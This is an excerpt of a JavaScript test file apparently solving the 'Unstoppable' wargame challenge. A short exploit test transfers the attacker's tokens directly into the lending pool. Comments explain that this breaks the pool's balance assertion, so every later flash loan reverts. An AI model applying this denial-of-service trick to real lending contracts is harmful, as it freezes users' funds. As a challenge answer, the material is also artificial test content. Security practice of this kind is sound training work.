...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Exploit", async function () {
    ...
    // we received INITIAL_ATTACKER_TOKEN_BALANCE Damn tokens
    // if we send these tokens directly to the pool, then
    // the condition of  assert(poolBalance == balanceBefore) in line 40 of Unstoppable Lender gets violated
    // in this case, the flash loan will always be reverted

    const tokenBalance = await this.token.balanceOf(attacker.address)
    //    console.log("token balance of attacker", tokenBalance)
    await this.token.connect(attacker).transfer(this.pool.address, tokenBalance)
  })
